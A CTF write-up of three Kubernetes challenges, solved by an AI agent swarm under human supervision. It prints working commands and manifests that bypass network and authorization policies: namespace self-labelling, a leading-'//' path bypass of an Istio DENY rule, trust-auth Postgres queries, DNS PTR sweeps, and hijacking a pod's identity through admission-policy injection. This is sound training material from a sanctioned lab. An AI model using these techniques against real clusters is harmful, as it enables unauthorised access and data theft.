---
title: "KubeCon NA 2026 CTF Writeup"
date: 2026-11-13T07:00:00-07:00
tags: ["security", "kubernetes", "ctf", "kubecon"]
toc: true
---

Another KubeCon, another set of three challenges from [ControlPlane](https://ctf.control-plane.io/). KubeCon NA 2026 brought the usual KubeSim formula: an SSH bundle per challenge, a fresh short-lived cluster, a deliberately split set of RBAC permissions, and flags hidden behind the exact misconfigurations the theme advertises. Three challenges, eight flags, 210 points on the board.

We finished **6 of 8 flags (130 points), holding #1 on the scoreboard at our last pull**, with both flags of the second challenge as first solves board-wide. The two broker flags on the third challenge outlasted our window — the full story of that hunt is included below, dead ends and all, since a write-up that only shows the wins teaches the wrong half of the trade.

> **Spoiler warning:** full solutions for six of the eight flags, plus a detailed map of where the other two live.

One note on "we": this run was executed by an AI agent swarm — one orchestrator/judge session and a rotating cast of fresh-context worker agents — that I supervised and steered. The challenge mechanics below stand on their own; the swarm gets its own section at the end for anyone curious how the sausage was made.

## Challenge 1 — open-gates

SSHing into the first bundle drops you at a root shell on `jumpbox`, with this banner:

```text
   ___  ____  _____ _   _    ____    _  _____ _____ ____
  / _ \|  _ \| ____| \ | |  / ___|  / \|_   _| ____/ ___|
 | | | | |_) |  _| |  \| | | |  _  / _ \ | | |  _| \___ \
 | |_| |  __/| |___ | |\  | | |_| |/ ___ \| | | |___ ___) |
  \___/|_|   |_____|_| \_|  \____/_/   \_\_| |_____|____/

  Welcome to the platform engineering jump host.

  The good news:
    We finally migrated to Gateway API.

  The bad news:
    Nobody agrees on who should be allowed to route what.

  Several teams have already migrated their services,
  while others are still figuring out how traffic is
  supposed to flow.

  You've been given limited access to investigate the
  current setup. Not everything is directly reachable,
  and not every namespace is under your control.

  Your mission:
    Explore the cluster, understand its routing
    configuration, and uncover three hidden flags.

  You have kubectl, a shell, and whatever permissions
  the platform team decided to give you.

  The gates are there. Whether they open is up to you.

  Good luck!
```

A Gateway API challenge wearing a platform-engineering costume. Before touching anything, run the universal opening that every one of these CTFs rewards:

```shell
kubectl auth whoami
kubectl auth can-i --list
# and critically, per namespace:
kubectl auth can-i --list -n frontend
kubectl auth can-i --list -n backend
kubectl auth can-i --list -n internal
kubectl auth can-i --list -n envoy-gateway-system
```

The per-namespace pass is where the challenge lives. Our permissions split deliberately:

- **`backend`**: full verbs on `httproutes` (Gateway API)
- **`internal`**: full verbs on `referencegrants`
- everywhere else: read-only

So the shape of the intended solve is already legible from RBAC alone: we create routes in `backend`, and we mint cross-namespace trust from `internal`.

Reading the routing state:

```shell
kubectl get gateway -A -o yaml        # one Gateway "eg" in frontend, allowedRoutes: All
kubectl get httproute -A              # one route: frontend serves / and /admin → frontend:80
kubectl get referencegrant -A         # zero
```

One Gateway (`eg` in `frontend`) that allows routes to attach from **all namespaces** — remember that. One existing HTTPRoute sending `/` and `/admin` to the frontend app on port 80. Zero ReferenceGrants, which matters for the third flag.

Network policy says the jumpbox cannot reach the app namespaces directly — but the `envoy-gateway-system` namespace can reach all of them. The Gateway is the only door.

### Flag 1 — who left admin exposed

The recon-then-obvious-probe pattern: the existing route already forwards `/admin` to the frontend app, and the Gateway's ClusterIP is reachable from the jumpbox. The route is bound to hostname `hello.k8s.ctf`, so send that Host header:

```shell
curl -s -H 'Host: hello.k8s.ctf' http://10.108.29.148/admin
```

```json
{
  "flag-1": "flag_ctf{who_left_admin_exposed}"
}
```

The platform team migrated to Gateway API and routed their own admin page through the front door. Ten points for one curl.

### Flag intel — the apps leak their own source

The next two flags need to know *where* to route. Here's the recon finding that saved us the most time: **full pod specs contain the apps' embedded Python source**. The apps are `BaseHTTPRequestHandler` one-pagers baked into the pod spec as a `command:`, so pulling each pod individually (`kubectl get pod -n backend backend-api-... -o yaml`) hands you the complete endpoint map:

- `backend-api` serves `/flag-2`
- `payments-api` (in `internal`) serves `/flag-3`
- both read the `ctf-flag` secret mounted at `/run/secrets`
- the frontend app serves `/`, `/status`, `/admin`

One caution from experience: a bulk `kubectl get pods -A -o yaml` truncates at the CLI's output limit and silently loses the embedded source — pull the pods individually.

### Flag 2 — speak httproute and enter

We have full verbs on `httproutes` in `backend`, and the Gateway accepts attach from all namespaces. Create a route in `backend` whose `parentRef` points at the Gateway in `frontend`, match on `/backend`, rewrite the prefix, and send traffic to `backend-api`:

```yaml
apiVersion: gateway.networking.k8s.io/v1
kind: HTTPRoute
metadata:
  name: ctf-backend-route
  namespace: backend
spec:
  parentRefs:
  - name: eg
    namespace: frontend
  hostnames:
  - hello.k8s.ctf
  rules:
  - matches:
    - path:
        type: PathPrefix
        value: /backend
    filters:
    - type: URLRewrite
      urlRewrite:
        path:
          type: ReplacePrefixMatch
          replacePrefixMatch: /
    backendRefs:
    - name: backend-api
      port: 80
```

```shell
kubectl apply -f route.yaml
sleep 6
curl -s -H 'Host: hello.k8s.ctf' http://10.108.29.148/backend/flag-2
```

```json
{
  "flag-2": "flag_ctf{speak_httproute_and_enter}"
}
```

### Flag 3 — permission to cross granted

Same shape, but the `backendRef` now points at `payments-api` **in the `internal` namespace**. This is where Gateway API's cross-namespace model bites: routes may attach to Gateways in other namespaces (governed by `allowedRoutes`), but a `backendRef` into another namespace requires a `ReferenceGrant` *from that namespace*. With no grant, the route is accepted but its refs don't resolve:

```shell
kubectl get httproute ctf-payments-route -n backend -o jsonpath='{.status}'
```

```json
{"parents":[{"conditions":[
  {"message":"Route is accepted","reason":"Accepted","status":"True","type":"Accepted"},
  {"message":"Failed to process route rule 0 backendRef 0: Backend ref to Service internal/payments-api not permitted by any ReferenceGrant.",
   "reason":"RefNotPermitted","status":"False","type":"ResolvedRefs"}
]}]}
```

That negative is the proof the gate is real. Now spend the second half of the permission split — `referencegrants` full verbs in `internal`:

```yaml
apiVersion: gateway.networking.k8s.io/v1beta1
kind: ReferenceGrant
metadata:
  name: ctf-allow-backend
  namespace: internal
spec:
  from:
  - group: gateway.networking.k8s.io
    kind: HTTPRoute
    namespace: backend
  to:
  - group: ""
    kind: Service
    name: payments-api
```

The route's `ResolvedRefs` condition flips to `True`, and the same curl lands:

```shell
curl -s -H 'Host: hello.k8s.ctf' http://10.108.29.148/payments/flag-3
```

```json
{
  "flag-3": "flag_ctf{permission_to_cross_granted}"
}
```

Challenge complete: 50/50. The two flags are a neat little tour of Gateway API's two trust boundaries — attachment (`allowedRoutes` on the Gateway) and reference (`ReferenceGrant` in the target namespace).

### Bonus recon surface

Not needed for flags, but worth knowing: the Envoy data-plane pods expose **unauthenticated Prometheus metrics on port 19001**, and the metrics leak the full programmed route topology (cluster names like `httproute/backend/ctf-backend-route` show up as soon as routes exist). If you can reach the Envoy pods, you can read the routing table.

## Challenge 2 — two-wrongs-make-a-route

The second bundle is a fresh cluster — new bastion, ~20 minutes old. You land as `root@dev` in the `dev` namespace:

```text
    +-------------------+       +-------------------+
    |    TWO WRONGS     |------>|   MAKE A ROUTE    |
    +-------------------+       +-------------------+

                    You shall not pass!

You've been given access to a pod in the 'dev' namespace of a
shared Kubernetes cluster. The platform team insists its internal
services are protected by multiple layers of security, though not
every layer has been customized beyond its default configuration.

They've invited you to test that claim using only the
permissions granted to your account.

Retrieve both flags.
```

Istio (1.31.4) + Flux + Calico. The target is the `platform/api` pod — a Python app whose source, again, is embedded verbatim in the pod spec: `GET /` returns flag 1, `GET /admin/config` returns flag 2. It's reachable at `api.platform.svc.cluster.local:8080`.

Recon turns up exactly two gates in front of it, both readable:

**Gate 1 — Calico.** NetworkPolicy `platform/allow-tcp-8080` allows ingress to the api pod on TCP 8080 **only from namespaces labeled `k8s.ctf/trusted=true`**. Exactly one namespace carries the label: `production`.

**Gate 2 — Istio.** AuthorizationPolicy `platform/api-admin` is a `DENY` on paths `/admin` and `/admin/*`, port 8080, for everyone **except** service account `production/admin-client`.

And our RBAC, dumped verbatim: read-only broadly, plus exactly **one write** — patch/update on Namespace `dev` and nothing else (`edit-dev-ns` ClusterRole, `resourceNames: [dev]`).

A lesson we paid for in miniature: dump the RBAC rule blocks **verbatim** before parsing them. A quick regex pass initially attributed Flux write permissions to us that actually belonged to an aggregated `edit` ClusterRole nobody bound to our account — a direct `kubectl auth can-i create gitrepositories.fluxcd.io` (answer: no) killed the misparse before anything was built on it.

### Flag 1 — trust me i set the label

Look at the Calico gate again: it trusts a *namespace label*. And we hold `patch namespace/dev`. The gate is self-service:

```shell
kubectl label ns dev k8s.ctf/trusted=true
curl -s http://api.platform.svc.cluster.local:8080/
```

```json
{
  "flag": "flag_ctf{trust_me_i_set_the_label}"
}
```

First wrong: the network policy trusts an attribute the tenant can set on itself. The flag name says the organizers agree.

That gets us to the app, but `/admin/config` still returns `403 RBAC: access denied` from the Envoy rbac filter (`server: istio-envoy` in the response headers). We can't create pods in `production`, can't mint `production/admin-client` identity, can't exec anywhere. So the second flag has to be a bypass of the DENY itself — a request-shape trick.

### Flag 2 — slashes tell two stories

The primary worker swept 26 path variants with `--path-as-is` (never let curl normalize for you). Condensed:

| Path (`--path-as-is`) | Result |
|---|---|
| `/admin/config` | 403 — RBAC: access denied |
| `/admin//config`, `/admin/./config`, `/admin/config/` | 403 — RBAC denied |
| `/./admin/config`, `/x/../admin/config` | 403 — RBAC denied |
| `/admin%2fconfig`, `/%2fadmin/config` | 404 — app-level miss |
| `/ADMIN/CONFIG`, `/Admin/config` | 404 — app-level miss |
| **`//admin/config`** | **200 — flag** |

```shell
curl -si --path-as-is http://api.platform.svc.cluster.local:8080//admin/config
```

```json
{
  "service": "platform-api",
  "route": "/admin/config",
  "event": "KubeCon NA 2026",
  "status": "internal",
  "config": {
    "network": "managed",
    "authorization": "managed",
    "last_review": "pending"
  },
  "message": "Operating as designed is a matter of perspective.",
  "flag": "flag_ctf{slashes_tell_two_stories}"
}
```

The mechanism is a path-normalization differential between three layers:

1. **Istio/Envoy RBAC** evaluates the **raw** `:path`. `//admin/config` does not prefix-match `/admin` or `/admin/*` (it starts with `//`), so the DENY rule's path condition never fires.
2. **Envoy's default `merge_slashes: true`** then normalizes the path *before forwarding upstream* — the app receives `/admin/config`.
3. The app does a strict `urlsplit(self.path).path == "/admin/config"` comparison, which now matches.

The banner told us exactly where to look: "not every layer has been customized beyond its default configuration" — `merge_slashes` is Envoy's default. The controls prove the differential: interior double slashes (`/admin//config` → 403) merge *before* RBAC sees the path, while a *leading* `//` survives the RBAC match and only merges for the upstream. Dot-segment and percent-encoded variants all fail one layer or the other.

Both flags were first solves board-wide on this challenge, and the flag name confirms the intent: RBAC reads one path, the app another — two stories.

### What the scouts killed

Worth recording because negative results were load-bearing here: the kubelet on the node was hardened (webhook authorization, 401/403 on every subresource, read-only port closed), and all Istio sidecar admin/telemetry ports (15000/15006/15020/15021/15090) were Calico-dropped from the dev pod — the `allow-tcp-8080` policy permits exactly one port. Two read-only scouts fenced off both rabbit holes in fifteen minutes each, so the mutation owner's whole budget went to the variant sweep that actually won.

## Challenge 3 — do-not-spill-the-honey

The third bundle is the big one (100 points across three flags) and the most atmospheric:

```text
          __         .' '.
        _/__)        .   .       .
       (8|)_}}- .      .        .
        `\__)    '. . ' ' .  . '


This Kubernetes cluster is rich with honey in the form of flags,
sweet enough to tempt any curious mind. Look closely: some may lie
hidden in tables among Utah's legends, while others drift through
message brokers. Take the challenge bravely, and let the Greeks'
ancient order guide your work.
```

Utah = the Beehive State, so: flags in a database ("tables among Utah's legends") and flags drifting through message brokers ("the Greeks' ancient order" = consume your topics alpha → beta → gamma). All three CTFd entries share one description: **"Hey! DNS the honey!"**

You land as root on `jumppod` (`system:serviceaccount:default:jumppod`). The RBAC dump is strange on purpose:

- get pods / services / logs, cluster-wide reads on namespaces and CiliumNetworkPolicies
- **delete pods in `ops` only** — nothing else, create nothing anywhere
- **update/patch on MutatingAdmissionPolicies** — the odd grant. An existing `add-team-platform-label` policy stamps `team: platform` onto every pod CREATE.

Visible workloads: `db-bastion` (alpine, its own service account) and `postgres:18` in `ops` — the latter with `POSTGRES_HOST_AUTH_METHOD=trust` sitting right in the pod spec. Plus two "collector" deployments and a `queue-alpha` label that shows up as a source selector in policies.

### Flag 1 — rbac audit prevents privilege escalation

The postgres pod is "protected" by a narrow CiliumNetworkPolicy: `postgres-only-from-db-bastion`. But read **every** policy that selects the postgres endpoint, not just the one named after it. An ops-wide `deny-ops-egress` policy also selects postgres, and it admits ingress from namespace `default` on any port. Cilium **unions** the allow rules of all policies selecting an endpoint — the broad policy quietly nullifies the narrow one:

```text
jumppod (ns default) ──TCP 5432──▶ postgres.ops.svc.cluster.local   OPEN
```

Combine with `POSTGRES_HOST_AUTH_METHOD=trust` and the database is one command away, no credentials:

```shell
psql -h postgres.ops.svc.cluster.local -U postgres -d postgres -P pager=off \
  -c "select * from public.utah_legendary_celebrities;"
```

```text
        name         |           hall_of_fame           | induction_year |                                   note
---------------------+----------------------------------+----------------+--------------------------------------------------------------------------
 Jack Dempsey        | Utah Sports Hall of Fame         |           1970 | World heavyweight boxing champion
 Steve Young         | Pro Football Hall of Fame        |           2005 | BYU alumnus and NFL quarterback
 Wat Misaka          | Utah Sports Hall of Fame         |           1999 | Historic NBA pioneer; flag_ctf{rbac_audit_prevents_privilege_escalation}
 Mark Eaton          | Utah Sports Hall of Fame         |           2010 | NBA Defensive Player of the Year
(15 rows)
```

`flag_ctf{rbac_audit_prevents_privilege_escalation}` — Wat Misaka, first non-white player in the NBA, Utah Sports Hall of Fame 1999. The flag text names the intended hard part: the RBAC grant set *looks* escalation-proof (no creates anywhere). The actual path was a network-policy union hole plus trust auth — nothing about RBAC at all.

One operational lesson we earned here, worth the pixels: the first database sweep ran `pg_dump` with stderr discarded, and the pg_dump **v14 client silently aborts against a PG 18.6 server**. The empty grep *looked* like "no flags anywhere," including the flag we'd already found. It was caught by re-running with stderr visible and testing the tool against a known-positive first. **Trust no empty sweep without a positive control.**

### Hey, DNS the honey

The remaining two flags live with the message brokers, and the challenge description says to use DNS. Here's the full map of what we established, because this is the part we didn't finish — and a good map of the negative space is still useful to anyone who did.

**The DNS discovery technique.** CoreDNS answers PTR records for service-endpoint pod IPs — `<ip-with-dashes>.<svc>.<ns>.svc.cluster.local`. A sweep of the whole pod CIDR (172.20.0.0/16, all 65,536 addresses, batched `dig -x`) recovers the complete service map **with zero RBAC**:

- `collector-data-processing` (10.99.197.236 → pod 172.20.0.48:8080) — all ports dropped from our vantage; Cilium-gated
- `collector-restricted` (10.102.146.251 → pod 172.20.0.39:8080) — reachable; an Express request-echo app
- `postgres.ops` — banked above
- `kube-dns` ×2
- **`queue-alpha`: no DNS presence at all.** No Service, no headless service, nothing. A dictionary sweep of ~200 plausible names (broker names, Greek letters and gods, honey/bee words, Utah legends) returned all NXDOMAIN — the only naming convention that exists on this cluster is `<role>-<namespace>`.

**The `pods insecure` trap.** CoreDNS's `pods insecure` mode (the distribution default) answers *any* `<ip>.<ns>.pod.cluster.local` query with the encoded IP without checking Kubernetes. Prove it before trusting any pod-form DNS result:

```shell
dig +short 8-8-8-8.kube-system.pod.cluster.local
# 8.8.8.8      ← resolves = insecure mode = pod-form results prove nothing
```

We caught this mid-run: a planned "does this pod exist" discriminator based on pod-form DNS would have false-confirmed pods in the network-policy drop zones. Negative controls must be *impossible* values, not just known-good ones.

**The service CIDR is exhausted too.** A PTR sweep of the service CIDR (10.96.0.0/12, covered exhaustively through 10.103.x and 55% beyond) inventories every Service: `kubernetes`, `kube-dns`, `hubble-peer` (standard Cilium), the two collectors, `postgres`. **No broker Service exists anywhere covered.** SRV, TXT, AXFR (refused), themed zones — all empty.

**The honeypot.** `collector-restricted` is the "do-not-spill-the-honey" warning made flesh. Thirteen probes — every route shape, methods, header and body variations, queue-themed payloads, HTTP/2, absolute-form targets — all return the identical 200 echo of the request, ~20ms, no storage, no auth, no SSRF, no fetch. It's a passive request-capture decoy: the exposed twin of the real, Cilium-gated `collector-data-processing`. Feed it nothing. (Amusing detail: Express `trust proxy` is on, so anything keying on `req.ip` behind it is `X-Forwarded-For`-spoofable — but no gate keys on it. It just wants to watch.)

### Where we ran out of clock

The broker flags require finding pods that are invisible to RBAC (can't list pods in their namespace), invisible to DNS (no Service), and possibly invisible to nmap (policy drop zones). What we established before the window closed:

- **Kubelets are hardened** on all three nodes — 401 anonymous, 403 with our SA on every metadata subresource, path-normalization tricks all fail, read-only port closed. The NA 2025-era `nodes/proxy` → kubelet-exec recipe is dead on this build.
- **Node inventory via kubelet TLS certificate CNs** — you don't need auth to read a cert's subject. Three nodes, one /24 of pod CIDR each, which proves the pod CIDR beyond 172.20.2.x is *empty* — an entire class of "keep scanning the /16" effort deleted.
- **etcd is network-reachable from the jumppod** (the same policy-union gap reaches the control plane) on master-1:2379 — but demands a client certificate from a standalone `etcd-ca`. If any identity escalation surfaces an etcd client cert, it converts directly into full cluster state, hidden pods included. We never found one. That was the single highest-value door left standing.
- **Postgres is conclusively not the broker** — `pg_stat_activity` shows zero application clients, no NOTIFY traffic on any plausible channel, no cron/amqp/replication extensions.
- **Cilium operator metrics** (node-2:9963) are unauthenticated and dump 900 lines of workqueue counters — nothing flag-shaped.
- **The house-style bet.** ControlPlane's pattern (documented in the NA 2024 write-ups) is that the intended solve is *the one write permission you hold*. Ours was update/patch on MutatingAdmissionPolicies plus delete-pods-in-`ops`: patch the `add-team-platform-label` MAP to inject a command into the *recreated* `db-bastion` pod, delete the pod, read the output from logs — a poor man's exec under someone else's service account. We used it to run SelfSubjectAccessReviews as the `db-bastion` identity (can it delete/patch/create pods in `data-processing`, list pods in `restricted`, read secrets?). The policy was reverted and the mutated pod cleaned up afterward. The identity question was still open when the clock ran out.
- **Full-port scans** of every live pod IP found exactly one nonstandard open port: 4240 on 172.20.0.107 — which is cilium-health. Not the broker.

Our best remaining theory when the window closed: the `queue-alpha` pods sit behind an **unreadable CiliumClusterwideNetworkPolicy** (the RBAC asymmetry is deliberate — namespaced CNPs are readable, clusterwide ones are not), reachable only from a `data-processing`-namespace identity, which is what the db-bastion hijack was probing toward. Flags 7 and 8 stayed unsold on our ledger. If you took them, this write-up is as much for you as from you.

## How this was actually run

The part that made this run different: no human typed the commands above. I supervised an **agent swarm** — one orchestrator/judge session (me, mostly reading) and fresh-context LLM workers (an open-weights model, served locally) dispatched in waves through an agent orchestration layer. The design came from our SOC research work, adapted from a hypothesis-testing swarm pattern; this CTF was its greenfield shakedown.

The setup:

- **A pattern pre-brief.** Before the event, we distilled four KubeCons' worth of public write-ups (Skybound's NA 2024 → EU 2026 series) plus Iain Smart's account of his solo Claude attempt at EU 2026 into a single pre-brief every worker reads: the universal opening (banner, home directory, `whoami`, per-namespace `can-i`, `api-resources`, enumerate everything `-o yaml`), a menu of misconfiguration families, where flags physically hide, and the known-hard techniques. Workers started from priors instead of rediscovering them under the clock.
- **Roles.** One **primary** per challenge owns all mutations. **Scouts** are read-only, one hypothesis family each, 15-minute hard budget. When the hunt stalled, dedicated **critic** agents got falsification assignments with per-hypothesis verdict deliverables. The orchestrator never hunts directly — it decomposes, dispatches, and judges.
- **An evidence contract.** Every command's raw output streams to timestamped log files in per-worker directories. The judge grades files, not summaries. A flag only counts when its exact string appears verbatim in a raw evidence capture, and verified flags go to CTFd immediately — no batching.
- **Refute-first judging.** Every return gets "what would make this wrong?" before "what did it find?" Failed scopes read as clean negatives, decoy credentials, stale state, wrong namespace. Dead ends are recorded as coverage so later waves don't re-hunt them.

How it held up:

- Challenge 1 went recon-to-complete in ~35 minutes, including a twenty-minute fight with the SSH login wrapper (below).
- Challenge 2's both flags were first solves board-wide; the orchestrator took flag 1 as an opening probe, a worker won flag 2 with the variant sweep.
- Challenge 3's database flag landed ~8 minutes after the wave dispatched. The broker hunt then consumed the rest of the window honestly.
- The dead-end recovery loop worked as designed, repeatedly: read-only scouts killed the kubelet theory, the sidecar-port theory, and the honeypot temptation before any mutation owner burned budget on them. Negative results fenced the search space — that was the scouts' whole job.
- The judge was wrong exactly once, instructively: armchair analysis predicted `//admin/config` would 404 (reasoning that Python's `urlsplit` would treat the leading `//` as a netloc). The empirical 26-variant sweep won anyway. When you can afford the sweep, sweep — model the mechanism afterward, from the observation.

Gotchas we hit that are worth stealing regardless of how you play:

1. **The bastion login wrapper demands a pty, remotely.** Plain `ssh bastion 'cmd'` prints the banner and runs *nothing* — the remote-side wrapper needs a TTY and exits 0 silently. `ssh -T` doesn't help because the demand is remote. The fix is a local pty: `printf 'cmd\nexit\n' | script -q /dev/null ssh ...`. Iain Smart's write-up hit the same wall config-side; this is the remote-side variant.
2. **CTFd API token auth requires `Content-Type: application/json`.** An `Accept` header alone leaves your `Authorization` token silently ignored and every API path 302s to `/login`. This cost us ~20 minutes and was nearly misdiagnosed as a bad token.
3. **A `~/.curlrc` with `--location` turns those 302s into fake 200s** (the login page renders as success). Use `curl -q` or a no-redirect client when debugging HTTP auth.
4. **Cost-0 hints are free intel.** Unlock every free hint immediately; the paid ones we left untouched (55 points' worth) as a matter of policy.
5. **The scoreboard and per-user solves endpoints are public pre-auth** — full board state, first-solve attribution, and challenge reconstruction are available without a token.
6. **Environments rotate per bundle.** Each challenge is a fresh cluster on a new bastion; check the banner and creationTimestamps before attributing probe results to a challenge.

## Conclusions

Six of eight flags, 130 points, #1 at the last board pull, both second-challenge flags first-solves board-wide, and one honest miss on the broker. Some closing thoughts for defenders, since that's the other reason these CTFs exist:

- **The one write permission you hold is the intended solve.** Every ControlPlane challenge we've touched follows this: `httproutes`+`referencegrants` split across two namespaces; `patch namespace/dev`; `update MutatingAdmissionPolicies` + `delete pods in ops`. Audit your RBAC by asking "what's the worst chain that starts from exactly this verb, on exactly this resourceNames scope" — not "is this role dangerous in isolation."
- **A network policy that trusts a self-servable label is decorative.** If the tenant can set the label (`patch namespaces` on their own namespace), the gate is theirs to open. Same family: trust anchors in pod labels tenants can choose.
- **Normalization differentials break L7 policy.** Any authz layer that prefix-matches the raw path, fronting a proxy that normalizes before the app, has a gap. Leading-`//` with `--path-as-is` is the canonical probe; interior `//` merging pre-RBAC vs. leading `//` merging post-RBAC was the whole challenge. If you run Istio/Envoy in front of strict-matching apps, sweep your own gates this way.
- **Policy engines that union allows can be nullified by their broadest policy.** Cilium unions the allow rules of every policy selecting an endpoint — an ops-wide "deny egress" that quietly admits one namespace defeated a purpose-built `postgres-only-from-db-bastion`. Read all policies selecting a target, not the one named after it.
- **`POSTGRES_HOST_AUTH_METHOD=trust` makes network policy the only gate.** That's a fine design if the network policy is actually sound — see above for how that went.
- **DNS is an RBAC-free recon channel.** CoreDNS PTR sweeps recover the service map without a single list permission, and `pods insecure` mints arbitrary A records for anyone who knows the encoding. For a hardened cluster, that's an information leak worth closing.

Thanks to ControlPlane for another excellent set — the honey challenge in particular is the best-designed piece of negative space we've played. If you finished the broker flags, I'd genuinely love to compare notes.

Further reading that seeded our pre-brief and is worth your time:

- [ControlPlane CTF setup](https://ctf.control-plane.io/setup/)
- [Skybound's KubeCon CTF write-ups](https://www.skybound.link/) (NA 2024 → EU 2026 — the pattern inventory)
- [Iain Smart, "KubeCon CTF: The Human Viewpoint"](https://blog.iainsmart.co.uk/posts/2026-03-25-claudes-ctf-experience/) (a solo Claude attempt at EU 2026)
